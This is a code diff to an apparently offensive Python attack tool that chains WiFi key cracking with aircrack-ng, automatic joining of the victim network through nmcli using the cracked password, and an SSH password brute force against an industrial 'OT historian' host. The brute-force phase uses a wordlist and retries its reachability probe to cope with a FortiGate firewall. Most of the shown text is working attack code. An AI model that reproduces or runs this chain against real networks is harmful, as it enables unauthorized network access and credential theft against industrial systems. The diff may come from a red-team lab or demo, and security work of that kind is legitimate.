@@ -624,10 +624,32 @@ def phase1_wifi_crack() -> PhaseResult:
                     key_line = next(
                         (l for l in out.splitlines() if "KEY FOUND" in l), "KEY FOUND"
                     )
+                    # Extract password from "KEY FOUND! [ password ]"
+                    found_password = ""
+                    if "[" in key_line and "]" in key_line:
+                        found_password = key_line[key_line.index("[")+1 : key_line.index("]")].strip()
+
                     r.status  = "success"
                     r.finding = key_line
                     r.output  = out[-1000:]
                     ok(r.finding)
+
+                    # Restore managed mode before nmcli tries to associate
+                    _restore_managed()
+
+                    if found_password:
+                        ok(f"Connecting to [bold]{chosen['ssid']}[/bold] via NetworkManager...")
+                        run_cmd(
+                            f"sudo nmcli dev wifi connect '{chosen['ssid']}' "
+                            f"password '{found_password}' ifname {iface}",
+                            capture=True,
+                        )
+                        info("Waiting 5 s for DHCP lease...")
+                        time.sleep(5)
+                        ok(f"wlan0 should now have an IP on the target network")
+                    else:
+                        warn("Could not parse password from aircrack output — connect manually")
+
                     return r
 
                 warn("aircrack-ng did not find the key")
@@ -708,29 +730,6 @@ def _tcp_reachable(ip: str, port: int, timeout: float = 1.0) -> bool:
     except (socket.timeout, ConnectionRefusedError, OSError):
         return False
 
-
-BRUTE_BANNER = """\
-  ___ ___ ___ _   _ _____ ___   ___ ___  ___ ___ ___
- | _ ) _ \\ | | | |_   _| __| | __/ _ \\| _ \\ __/ __|
- | _ \\   / |_| |   | | | _|  | _| (_) |   / _|\\__ \\
- |___/_|_\\\\___/    |_| |___| |_|_\\___/|_|_\\___|___/
-
-     ___    _   ___ _  __     _    ___  _  _____ ___
-    / __|  /_\\ / __| |/ /    /_\\  |   \\| ||_ _| _ \\\ 
-   | (__  / _ \\ (__| ' <    / _ \\ | |) | |__| ||   /
-    \\___/_/ \\_ \\___|_|\\_\\  /_/ \\_\\|___/|____|___|_|_\\
-"""
-
-LOCK_ART = """\
-        +-----+
-        |     |
-        | OT  |
-        |HIST |
-     +--+-----+--+
-     |  LOCKED   |
-     |  TARGET   |
-     +-----------+
-"""
 
 
 def _ssh_bruteforce(
@@ -840,26 +839,35 @@ def phase3_ssh_bruteforce() -> PhaseResult:
     phase_header(3, "SSH Brute Force on Historian (paramiko)")
     r = PhaseResult("SSH Brute Force")
 
-    console.print(f"[cyan]{LOCK_ART}[/cyan]")
-    console.print(f"[bold red]{BRUTE_BANNER}[/bold red]")
-
     ip   = CFG["historian"]["ip"]
     port = CFG["historian"]["port"]
     user = CFG["historian"]["username"]
     wl   = _resolve_wordlist(CFG["hydra"]["wordlist"])
 
-    info(f"Target: {user}@{ip}:{port}")
+    console.print(Panel(
+        f"[bold white]Target   :[/bold white] [bold yellow]{user}@{ip}:{port}[/bold yellow]\n"
+        f"[bold white]Wordlist :[/bold white] {wl or 'priority list only'}",
+        title="[bold white] SSH BRUTE FORCE INITIATED [/bold white]",
+        border_style="red",
+        expand=False,
+        padding=(1, 4),
+    ))
 
-    # ── Fail-fast: TCP probe only — don't gate on Phase 2 status ─────────────
-    # Phase 2 may report failed due to nmap quirks while SSH is still open.
-    # The TCP probe is the only authoritative reachability check.
-    info(f"TCP probe → {user}@{ip}:{port} ...")
-    if not _tcp_reachable(ip=ip, port=port, timeout=2.0):
+    # ── Fail-fast: retry TCP probe up to 3× — FortiGate SYN-proxy safe ───────
+    MAX_PROBE_ATTEMPTS = 3
+    for attempt in range(1, MAX_PROBE_ATTEMPTS + 1):
+        info(f"TCP probe attempt {attempt}/{MAX_PROBE_ATTEMPTS} → {ip}:{port}  (4 s timeout)")
+        if _tcp_reachable(ip=ip, port=port, timeout=4.0):
+            ok(f"Port {port} open on {ip} — starting brute force")
+            break
+        warn(f"Attempt {attempt} timed out")
+        if attempt < MAX_PROBE_ATTEMPTS:
+            time.sleep(2)
+    else:
         r.status  = "failed"
-        r.finding = f"Target unreachable — {ip}:{port} timed out (FortiGate may be blocking)"
+        r.finding = f"Target unreachable — {ip}:{port} timed out after {MAX_PROBE_ATTEMPTS} attempts"
         err(r.finding)
         return r
-    ok(f"Port {port} open on {ip} — starting brute force")
 
     if not wl:
         warn("rockyou.txt not found — running priority-list only")
